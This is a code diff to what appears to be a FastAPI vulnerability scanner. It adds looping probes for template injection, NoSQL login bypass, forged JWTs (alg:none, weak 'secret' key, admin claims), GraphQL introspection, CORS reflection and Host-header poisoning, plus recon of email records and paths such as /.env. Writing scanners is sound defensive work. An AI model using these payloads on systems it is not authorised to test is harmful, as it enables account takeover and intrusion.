@@ -1499,6 +1499,411 @@ async def phone_probe_attack(phone: str, duration: int, intensity: int, attack_i
         await asyncio.sleep(1.0 / max(intensity, 1))
 
 
+async def ssti_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
+    """Server-Side Template Injection (SSTI) arithmetic canary verification."""
+    base = format_url(url).rstrip('/')
+    canaries = [
+        ("{{7*719}}", "5033", "Jinja2 / Twig / Nunjucks"),
+        ("${7*719}", "5033", "Freemarker / Velocity / EL"),
+        ("<%= 7*719 %>", "5033", "ERB / EJS"),
+        ("#{7*719}", "5033", "Pug / Slim / Ruby"),
+        ("{{7*'7'}}", "7777777", "Jinja2 String Multiplication")
+    ]
+    endpoints = [
+        f"{base}/api/render?template=",
+        f"{base}/search?q=",
+        f"{base}/?name=",
+        f"{base}/?template=",
+        f"{base}/?view="
+    ]
+    start_time = time.time()
+    idx = 0
+    connector = aiohttp.TCPConnector(ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        # Baseline check so we never false-positive if 5033 is already on the page
+        baseline_text = ""
+        try:
+            async with session.get(base, timeout=aiohttp.ClientTimeout(total=4)) as b_resp:
+                baseline_text = await b_resp.text()
+        except Exception:
+            pass
+
+        while time.time() - start_time < duration and metrics["attacks_running"]:
+            expr, expected, engine = canaries[idx % len(canaries)]
+            ep_prefix = endpoints[(idx // len(canaries)) % len(endpoints)]
+            idx += 1
+            import urllib.parse
+            test_url = f"{ep_prefix}{urllib.parse.quote(expr)}"
+            t0 = time.time()
+            try:
+                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+                    body = await resp.text()
+                    elapsed = time.time() - t0
+                    await record_request_metric(resp.status < 500, elapsed, resp.status)
+                    if expected in body and expected not in baseline_text:
+                        await _broadcast_finding({
+                            "type": f"Server-Side Template Injection ({engine})",
+                            "severity": "Critical",
+                            "url": test_url,
+                            "payload": expr,
+                            "detail": f"Template expression '{expr}' was evaluated server-side to '{expected}', confirming {engine} template injection.",
+                            "evidence": f"HTTP {resp.status} — Evaluated output '{expected}' found in response body",
+                            "timestamp": datetime.now().isoformat(),
+                            "attack_id": attack_id
+                        })
+                        await manager.broadcast(json.dumps({
+                            "type": "log",
+                            "message": f"[SSTI] Evaluated {expr} -> {expected} ({engine}) at {test_url}",
+                            "level": "error"
+                        }))
+            except Exception:
+                await record_request_metric(False)
+            await asyncio.sleep(1.0 / max(intensity, 1))
+
+
+async def nosql_injection_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
+    """NoSQL Operator ($ne, $gt, $regex) & Filter Injection Auditor."""
+    base = format_url(url).rstrip('/')
+    json_payloads = [
+        {"username": {"$ne": None}, "password": {"$ne": None}},
+        {"username": {"$gt": ""}, "password": {"$gt": ""}},
+        {"username": "admin", "password": {"$ne": "invalid_canary_991"}},
+        {"username": {"$regex": "^adm"}, "password": {"$ne": None}},
+    ]
+    query_probes = [
+        f"{base}/api/users?id[$ne]=0",
+        f"{base}/api/products?id[$gt]=0",
+        f"{base}/login?username[$ne]=null&password[$ne]=null",
+    ]
+    post_endpoints = [f"{base}/api/nosql/login", f"{base}/api/login", f"{base}/login"]
+    start_time = time.time()
+    idx = 0
+    connector = aiohttp.TCPConnector(ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        while time.time() - start_time < duration and metrics["attacks_running"]:
+            payload = json_payloads[idx % len(json_payloads)]
+            post_ep = post_endpoints[idx % len(post_endpoints)]
+            q_ep    = query_probes[idx % len(query_probes)]
+            idx += 1
+
+            # 1. JSON Operator POST probe
+            t0 = time.time()
+            try:
+                async with session.post(
+                    post_ep,
+                    json=payload,
+                    timeout=aiohttp.ClientTimeout(total=5)
+                ) as resp:
+                    body = await resp.text()
+                    elapsed = time.time() - t0
+                    await record_request_metric(resp.status < 500, elapsed, resp.status)
+                    body_lower = body.lower()
+                    if resp.status == 200 and any(k in body_lower for k in ("authenticated", "token", "superuser", "welcome")):
+                        await _broadcast_finding({
+                            "type": "NoSQL Operator Authentication Bypass",
+                            "severity": "Critical",
+                            "url": post_ep,
+                            "payload": json.dumps(payload),
+                            "detail": "Authentication endpoint accepted MongoDB/NoSQL comparison operators ($ne / $gt) in JSON body without type sanitization.",
+                            "evidence": f"HTTP 200 | Response: {body[:160]}",
+                            "timestamp": datetime.now().isoformat(),
+                            "attack_id": attack_id
+                        })
+                        await manager.broadcast(json.dumps({
+                            "type": "log",
+                            "message": f"[NoSQLi] Operator bypass confirmed on {post_ep}",
+                            "level": "error"
+                        }))
+                    elif any(err in body_lower for err in ("mongoerror", "casterror", "$where", "bson", "couchdb")):
+                        await _broadcast_finding({
+                            "type": "NoSQL Error / Query Structure Leakage",
+                            "severity": "High",
+                            "url": post_ep,
+                            "payload": json.dumps(payload),
+                            "detail": "Database driver leaked internal NoSQL parser/operator exception details.",
+                            "evidence": body[:160],
+                            "timestamp": datetime.now().isoformat(),
+                            "attack_id": attack_id
+                        })
+            except Exception:
+                await record_request_metric(False)
+
+            # 2. URL Query Operator GET probe
+            t1 = time.time()
+            try:
+                async with session.get(q_ep, timeout=aiohttp.ClientTimeout(total=5)) as q_resp:
+                    q_body = await q_resp.text()
+                    await record_request_metric(q_resp.status < 500, time.time() - t1, q_resp.status)
+                    if any(err in q_body.lower() for err in ("mongoerror", "casterror", "bson")):
+                        await _broadcast_finding({
+                            "type": "NoSQL Query Parameter Operator Injection",
+                            "severity": "High",
+                            "url": q_ep,
+                            "payload": q_ep.split("?", 1)[-1],
+                            "detail": "Query parameter array/object notation triggered a NoSQL driver error.",
+                            "evidence": q_body[:160],
+                            "timestamp": datetime.now().isoformat(),
+                            "attack_id": attack_id
+                        })
+            except Exception:
+                await record_request_metric(False)
+
+            await asyncio.sleep(1.0 / max(intensity, 1))
+
+
+async def jwt_audit_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
+    """JWT Signature Verification ('alg: none', Tampered Signature, Weak HMAC Key) Auditor."""
+    import base64
+    import hmac
+    import hashlib
+
+    def _b64u(data: bytes) -> str:
+        return base64.urlsafe_b64encode(data).decode().rstrip("=")
+
+    hdr_none = _b64u(json.dumps({"alg": "none", "typ": "JWT"}).encode())
+    hdr_hs256 = _b64u(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
+    claims = _b64u(json.dumps({"sub": "admin", "role": "admin", "iat": int(time.time())}).encode())
+
+    # 1. alg:none token
+    tok_none = f"{hdr_none}.{claims}."
+    # 2. Tampered signature token
+    tok_tampered = f"{hdr_hs256}.{claims}.tampered_signature_canary_00"
+    # 3. Weak default secret ('secret') HMAC-SHA256 token
+    sig_weak = _b64u(hmac.new(b"secret", f"{hdr_hs256}.{claims}".encode(), hashlib.sha256).digest())
+    tok_weak = f"{hdr_hs256}.{claims}.{sig_weak}"
+
+    probes = [
+        ("alg:none Unsigned Token", tok_none, "Critical", "Endpoint accepted an unsigned JWT with header 'alg: none'."),
+        ("Unverified Signature Token", tok_tampered, "Critical", "Endpoint decoded JWT claims without verifying the cryptographic signature."),
+        ("Weak HMAC Secret ('secret')", tok_weak, "High", "Endpoint accepted a JWT signed with the default weak HMAC secret 'secret'."),
+    ]
+    base = format_url(url).rstrip('/')
+    endpoints = [f"{base}/api/auth/verify", f"{base}/api/profile", f"{base}/api/me", f"{base}/api/users/1"]
+
+    start_time = time.time()
+    idx = 0
+    connector = aiohttp.TCPConnector(ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        while time.time() - start_time < duration and metrics["attacks_running"]:
+            label, token, sev, detail = probes[idx % len(probes)]
+            ep = endpoints[(idx // len(probes)) % len(endpoints)]
+            idx += 1
+            t0 = time.time()
+            try:
+                async with session.get(
+                    ep,
+                    headers={"Authorization": f"Bearer {token}"},
+                    timeout=aiohttp.ClientTimeout(total=5)
+                ) as resp:
+                    body = await resp.text()
+                    elapsed = time.time() - t0
+                    await record_request_metric(resp.status < 500, elapsed, resp.status)
+                    if resp.status == 200 and any(k in body.lower() for k in ("authenticated", "principal", "admin", "role")):
+                        await _broadcast_finding({
+                            "type": f"JWT Vulnerability: {label}",
+                            "severity": sev,
+                            "url": ep,
+                            "payload": f"Authorization: Bearer {token[:48]}...",
+                            "detail": detail,
+                            "evidence": f"HTTP 200 | Response: {body[:160]}",
+                            "timestamp": datetime.now().isoformat(),
+                            "attack_id": attack_id
+                        })
+                        await manager.broadcast(json.dumps({
+                            "type": "log",
+                            "message": f"[JWT Audit] {label} accepted at {ep}",
+                            "level": "error"
+                        }))
+            except Exception:
+                await record_request_metric(False)
+            await asyncio.sleep(1.0 / max(intensity, 1))
+
+
+async def graphql_audit_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
+    """GraphQL Schema Introspection & Query Batching Posture Auditor."""
+    base = format_url(url).rstrip('/')
+    endpoints = [f"{base}/graphql", f"{base}/api/graphql", f"{base}/v1/graphql", f"{base}/query"]
+    introspection_q = {"query": "query IntrospectionAudit { __schema { queryType { name } mutationType { name } types { name kind } } }"}
+    batch_q = [{"query": "{ __typename }"}, {"query": "{ __typename }"}, {"query": "{ __typename }"}]
+
+    start_time = time.time()
+    idx = 0
+    connector = aiohttp.TCPConnector(ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        while time.time() - start_time < duration and metrics["attacks_running"]:
+            ep = endpoints[idx % len(endpoints)]
+            idx += 1
+
+            # 1. Introspection check
+            t0 = time.time()
+            try:
+                async with session.post(
+                    ep,
+                    json=introspection_q,
+                    headers={"Content-Type": "application/json"},
+                    timeout=aiohttp.ClientTimeout(total=5)
+                ) as resp:
+                    body = await resp.text()
+                    elapsed = time.time() - t0
+                    await record_request_metric(resp.status < 500, elapsed, resp.status)
+                    if resp.status == 200 and "__schema" in body:
+                        await _broadcast_finding({
+                            "type": "GraphQL Introspection Enabled in Production",
+                            "severity": "High",
+                            "url": ep,
+                            "payload": "POST {\"query\": \"{ __schema { types { name kind } } }\"}",
+                            "detail": "GraphQL endpoint allows unauthenticated schema introspection, exposing all internal object types, fields, and mutations.",
+                            "evidence": body[:180],
+                            "timestamp": datetime.now().isoformat(),
+                            "attack_id": attack_id
+                        })
+                        await manager.broadcast(json.dumps({
+                            "type": "log",
+                            "message": f"[GraphQL Audit] Full schema introspection exposed at {ep}",
+                            "level": "error"
+                        }))
+            except Exception:
+                await record_request_metric(False)
+
+            # 2. Query Batching check
+            t1 = time.time()
+            try:
+                async with session.post(
+                    ep,
+                    json=batch_q,
+                    headers={"Content-Type": "application/json"},
+                    timeout=aiohttp.ClientTimeout(total=5)
+                ) as b_resp:
+                    b_body = await b_resp.text()
+                    await record_request_metric(b_resp.status < 500, time.time() - t1, b_resp.status)
+                    if b_resp.status == 200 and b_body.strip().startswith("[") and "__typename" in b_body:
+                        await _broadcast_finding({
+                            "type": "GraphQL Array Query Batching Allowed",
+                            "severity": "Medium",
+                            "url": ep,
+                            "payload": "POST [{\"query\": \"{ __typename }\"}, ...]",
+                            "detail": "GraphQL server executes batched JSON arrays of queries in a single HTTP request, enabling rate-limit amplification.",
+                            "evidence": b_body[:160],
+                            "timestamp": datetime.now().isoformat(),
+                            "attack_id": attack_id
+                        })
+            except Exception:
+                await record_request_metric(False)
+
+            await asyncio.sleep(1.0 / max(intensity, 1))
+
+
+async def cors_audit_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
+    """Deep CORS Origin Reflection, Null-Origin & Pre-Flight Trust Auditor."""
+    base = format_url(url).rstrip('/')
+    host = re.sub(r'^https?://', '', base).split('/')[0].split(':')[0]
+    test_origins = [
+        ("https://evil-cors-audit.invalid", "Arbitrary Origin Reflection"),
+        ("null", "Sandboxed 'null' Origin Trusted"),
+        (f"https://{host}.evil-cors-audit.invalid", "Prefix Subdomain Regex Bypass"),
+        (f"https://evil-{host}", "Suffix Regex Bypass"),
+        (f"http://{host}", "Insecure HTTP Origin Trust"),
+    ]
+    start_time = time.time()
+    idx = 0
+    connector = aiohttp.TCPConnector(ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        while time.time() - start_time < duration and metrics["attacks_running"]:
+            origin_val, label = test_origins[idx % len(test_origins)]
+            method = "OPTIONS" if idx % 2 == 1 else "GET"
+            idx += 1
+            t0 = time.time()
+            try:
+                async with session.request(
+                    method,
+                    base,
+                    headers={
+                        "Origin": origin_val,
+                        "Access-Control-Request-Method": "POST",
+                        "Access-Control-Request-Headers": "Authorization, Content-Type"
+                    },
+                    timeout=aiohttp.ClientTimeout(total=5)
+                ) as resp:
+                    elapsed = time.time() - t0
+                    await record_request_metric(resp.status < 500, elapsed, resp.status)
+                    acao = resp.headers.get("Access-Control-Allow-Origin", "")
+                    acac = resp.headers.get("Access-Control-Allow-Credentials", "").lower()
+                    if acao and (acao == origin_val or acao == "*"):
+                        sev = "Critical" if (acao == origin_val and acac == "true") else "High"
+                        await _broadcast_finding({
+                            "type": f"CORS Misconfiguration: {label}",
+                            "severity": sev,
+                            "url": base,
+                            "payload": f"{method} with Origin: {origin_val}",
+                            "detail": f"Server responded with Access-Control-Allow-Origin: {acao} and Allow-Credentials: {acac or 'false'} for {label}.",
+                            "evidence": f"HTTP {resp.status} ({method}) | ACAO: {acao} | ACAC: {acac or 'absent'}",
+                            "timestamp": datetime.now().isoformat(),
+                            "attack_id": attack_id
+                        })
+                        await manager.broadcast(json.dumps({
+                            "type": "log",
+                            "message": f"[CORS Audit] {label} confirmed ({method} -> ACAO: {acao})",
+                            "level": "warning"
+                        }))
+            except Exception:
+                await record_request_metric(False)
+            await asyncio.sleep(1.0 / max(intensity, 1))
+
+
+async def host_header_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
+    """Host Header Injection, Password Reset Poisoning & Cache Poisoning Auditor."""
+    base = format_url(url).rstrip('/')
+    canary_host = "canary-host-audit.invalid"
+    header_variants = [
+        {"X-Forwarded-Host": canary_host},
+        {"X-Host": canary_host},
+        {"X-Forwarded-Server": canary_host},
+        {"Forwarded": f"host={canary_host};proto=https"},
+    ]
+    paths = ["/api/reset-password", "/", "/login", "/redirect"]
+    start_time = time.time()
+    idx = 0
+    connector = aiohttp.TCPConnector(ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        while time.time() - start_time < duration and metrics["attacks_running"]:
+            hdr = header_variants[idx % len(header_variants)]
+            path = paths[(idx // len(header_variants)) % len(paths)]
+            idx += 1
+            target_ep = f"{base}{path}"
+            t0 = time.time()
+            try:
+                async with session.get(
+                    target_ep,
+                    headers=hdr,
+                    allow_redirects=False,
+                    timeout=aiohttp.ClientTimeout(total=5)
+                ) as resp:
+                    body = await resp.text()
+                    elapsed = time.time() - t0
+                    await record_request_metric(resp.status < 500, elapsed, resp.status)
+                    hdr_str = str(dict(resp.headers))
+                    if canary_host in body or canary_host in hdr_str:
+                        hdr_name = list(hdr.keys())[0]
+                        await _broadcast_finding({
+                            "type": f"Host Header Injection ({hdr_name})",
+                            "severity": "High",
+                            "url": target_ep,
+                            "payload": f"{hdr_name}: {canary_host}",
+                            "detail": f"Application trusted unvalidated '{hdr_name}' header and reflected '{canary_host}' into generated links or response headers (Password Reset / Cache Poisoning risk).",
+                            "evidence": f"HTTP {resp.status} | Reflected '{canary_host}' in response",
+                            "timestamp": datetime.now().isoformat(),
+                            "attack_id": attack_id
+                        })
+                        await manager.broadcast(json.dumps({
+                            "type": "log",
+                            "message": f"[Host Header] Unvalidated {hdr_name} reflected at {target_ep}",
+                            "level": "error"
+                        }))
+            except Exception:
+                await record_request_metric(False)
+            await asyncio.sleep(1.0 / max(intensity, 1))
+
+
 async def run_attack_coordinator(req: AttackRequest, attack_id: str):
     metrics["attacks_running"] = True
     metrics["current_attacks"].append(req.attack_type)
@@ -1567,6 +1972,18 @@ async def run_attack_coordinator(req: AttackRequest, attack_id: str):
             await open_redirect_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
         elif req.attack_type == "header_inj":
             await header_injection_attack(req.url, req.duration, req.intensity, req.threads, attack_id, req.custom_header_payload)
+        elif req.attack_type == "ssti":
+            await ssti_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
+        elif req.attack_type == "nosql":
+            await nosql_injection_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
+        elif req.attack_type == "jwt_audit":
+            await jwt_audit_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
+        elif req.attack_type == "graphql_audit":
+            await graphql_audit_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
+        elif req.attack_type == "cors_audit":
+            await cors_audit_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
+        elif req.attack_type == "host_header":
+            await host_header_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
         elif req.attack_type == "ip_stress":
             ip_target = req.url.strip()
             proto = "tcp"
@@ -2575,6 +2992,189 @@ async def wifi_security_audit():
         "network_count": len(networks),
         "networks": networks
     })
+
+
+@app.post("/api/recon/email-security")
+async def recon_email_security(req: ReconRequest):
+    """Passive DMARC, SPF, DKIM & MX Anti-Spoofing Posture Auditor."""
+    domain = re.sub(r'^https?://', '', req.target.strip()).split('/')[0].split(':')[0]
+    spf_records: List[str] = []
+    dmarc_records: List[str] = []
+    mx_records: List[str] = []
+    dkim_found: Dict[str, str] = {}
+
+    def _resolve_dns():
+        resolver = dns.resolver.Resolver()
+        resolver.timeout = 3.0
+        resolver.lifetime = 3.0
+        try:
+            for r in resolver.resolve(domain, "MX"):
+                mx_records.append(str(r.exchange).rstrip("."))
+        except Exception:
+            pass
+        try:
+            for r in resolver.resolve(domain, "TXT"):
+                txt = "".join(s.decode("utf-8", errors="ignore") if isinstance(s, bytes) else str(s) for s in r.strings)
+                if "v=spf1" in txt.lower():
+                    spf_records.append(txt)
+        except Exception:
+            pass
+        try:
+            for r in resolver.resolve(f"_dmarc.{domain}", "TXT"):
+                txt = "".join(s.decode("utf-8", errors="ignore") if isinstance(s, bytes) else str(s) for s in r.strings)
+                if "v=dmarc1" in txt.lower():
+                    dmarc_records.append(txt)
+        except Exception:
+            pass
+        for sel in ("default", "google", "selector1", "selector2", "k1", "mail"):
+            try:
+                ans = resolver.resolve(f"{sel}._domainkey.{domain}", "TXT")
+                for r in ans:
+                    txt = "".join(s.decode("utf-8", errors="ignore") if isinstance(s, bytes) else str(s) for s in r.strings)
+                    dkim_found[sel] = txt[:120]
+            except Exception:
+                pass
+
+    await asyncio.to_thread(_resolve_dns)
+
+    spf_str = spf_records[0] if spf_records else ""
+    dmarc_str = dmarc_records[0] if dmarc_records else ""
+    spoofable = True
+    issues = []
+
+    if not spf_str:
+        issues.append("Missing SPF TXT record (v=spf1) on root domain")
+    elif "+all" in spf_str:
+        issues.append("Critical: SPF uses '+all' (allows any IP to send mail as domain)")
+    elif "~all" in spf_str:
+        issues.append("SPF uses SoftFail ('~all') instead of strict Fail ('-all')")
+
+    if not dmarc_str:
+        issues.append(f"Missing DMARC record at _dmarc.{domain}")
+    elif "p=none" in dmarc_str.lower():
+        issues.append("DMARC policy is 'p=none' (monitoring only — spoofed emails are not blocked)")
+    elif "p=reject" in dmarc_str.lower() or "p=quarantine" in dmarc_str.lower():
+        spoofable = False
+
+    grade = "A" if (not spoofable and "-all" in spf_str) else ("B" if not spoofable else ("C" if (spf_str or dmarc_str) else "F"))
+
+    return JSONResponse(content={
+        "domain": domain,
+        "anti_spoofing_grade": grade,
+        "spoofable": spoofable,
+        "mx_servers": mx_records,
+        "spf_record": spf_str or "Absent",
+        "dmarc_record": dmarc_str or "Absent",
+        "dkim_selectors_detected": dkim_found,
+        "findings": issues or ["Strict SPF and DMARC enforcement verified"]
+    })
+
+
+@app.post("/api/recon/cors-matrix")
+async def recon_cors_matrix(req: ReconRequest):
+    """Multi-Origin CORS Trust Matrix Auditor."""
+    url = format_url(req.target.strip())
+    host = re.sub(r'^https?://', '', url).split('/')[0].split(':')[0]
+    origins = [
+        ("Arbitrary External Origin", "https://external-auditor.invalid"),
+        ("Null Origin (Sandboxed Iframe)", "null"),
+        ("Subdomain Prefix Bypass", f"https://{host}.external-auditor.invalid"),
+        ("Unanchored Suffix Bypass", f"https://evil{host}"),
+        ("HTTP Downgrade Origin", f"http://{host}"),
+        ("Same-Host Local Port", f"http://{host}:8080"),
+    ]
+    matrix = []
+    connector = aiohttp.TCPConnector(ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        for label, origin_val in origins:
+            try:
+                async with session.options(
+                    url,
+                    headers={
+                        "Origin": origin_val,
+                        "Access-Control-Request-Method": "POST",
+                        "Access-Control-Request-Headers": "Authorization, Content-Type"
+                    },
+                    timeout=aiohttp.ClientTimeout(total=5)
+                ) as resp:
+                    acao = resp.headers.get("Access-Control-Allow-Origin", "None")
+                    acac = resp.headers.get("Access-Control-Allow-Credentials", "false")
+                    trusted = acao in (origin_val, "*")
+                    risk = "CRITICAL" if (trusted and acac.lower() == "true" and acao != "*") else ("HIGH" if trusted else "SAFE")
+                    matrix.append({
+                        "test_case": label,
+                        "origin_sent": origin_val,
+                        "status_code": resp.status,
+                        "allow_origin": acao,
+                        "allow_credentials": acac,
+                        "trusted": trusted,
+                        "risk": risk
+                    })
+            except Exception as e:
+                matrix.append({"test_case": label, "origin_sent": origin_val, "error": str(e), "risk": "UNKNOWN"})
+
+    vulnerable_cases = [m for m in matrix if m.get("risk") in ("CRITICAL", "HIGH")]
+    return JSONResponse(content={
+        "target": url,
+        "vulnerable_count": len(vulnerable_cases),
+        "cors_matrix": matrix
+    })
+
+
+@app.post("/api/recon/api-discovery")
+async def recon_api_discovery(req: ReconRequest):
+    """OpenAPI, GraphQL, Actuator & Well-Known API Surface Discovery."""
+    base = format_url(req.target.strip()).rstrip('/')
+    paths = [
+        ("/openapi.json", "OpenAPI 3.0 Specification"),
+        ("/swagger.json", "Swagger 2.0 Specification"),
+        ("/docs", "FastAPI / Swagger UI"),
+        ("/redoc", "ReDoc API Documentation"),
+        ("/graphql", "GraphQL Endpoint"),
+        ("/api/status", "API Status Telemetry"),
+        ("/api/users/1", "REST User Resource"),
+        ("/api/comments", "REST Comments Resource"),
+        ("/actuator/health", "Spring Boot Actuator Health"),
+        ("/actuator/env", "Spring Boot Actuator Environment"),
+        ("/metrics", "Prometheus Metrics Exporter"),
+        ("/.well-known/security.txt", "RFC 9116 Security Policy"),
+        ("/.well-known/openid-configuration", "OIDC Discovery Metadata"),
+        ("/robots.txt", "Robots Exclusion Policy"),
+        ("/sitemap.xml", "XML Sitemap"),
+        ("/.env", "Dotenv Configuration Exposure"),
+    ]
+    discovered = []
+    connector = aiohttp.TCPConnector(ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        async def _probe(p: str, desc: str):
+            t0 = time.time()
+            try:
+                async with session.get(f"{base}{p}", allow_redirects=False, timeout=aiohttp.ClientTimeout(total=4)) as r:
+                    body = await r.read()
+                    elapsed_ms = round((time.time() - t0) * 1000, 1)
+                    if r.status in (200, 201, 206, 401, 403, 405):
+                        discovered.append({
+                            "path": p,
+                            "classification": desc,
+                            "status": r.status,
+                            "content_type": r.headers.get("Content-Type", "unknown"),
+                            "bytes": len(body),
+                            "latency_ms": elapsed_ms,
+                            "accessible": r.status in (200, 201, 206)
+                        })
+            except Exception:
+                pass
+
+        await asyncio.gather(*[_probe(p, d) for p, d in paths])
+
+    discovered.sort(key=lambda x: (not x["accessible"], x["path"]))
+    return JSONResponse(content={
+        "target": base,
+        "probed_endpoints": len(paths),
+        "discovered_count": len(discovered),
+        "endpoints": discovered
+    })
+
 
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket):
